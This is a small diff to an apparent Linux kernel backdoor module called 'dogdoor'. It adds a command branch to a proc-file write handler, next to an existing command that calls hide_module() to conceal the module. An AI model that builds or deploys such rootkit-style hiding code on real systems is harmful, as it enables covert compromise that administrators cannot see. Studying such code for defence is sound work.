@@ -151,6 +151,9 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 		printk("index completed");
 		sscanf(buf+1, "%d", &inpid);
 	}	
+	else if(index==4){
+		inpid =-31;
+	}	
 	if(index==5){
 		hide_module();
 	}
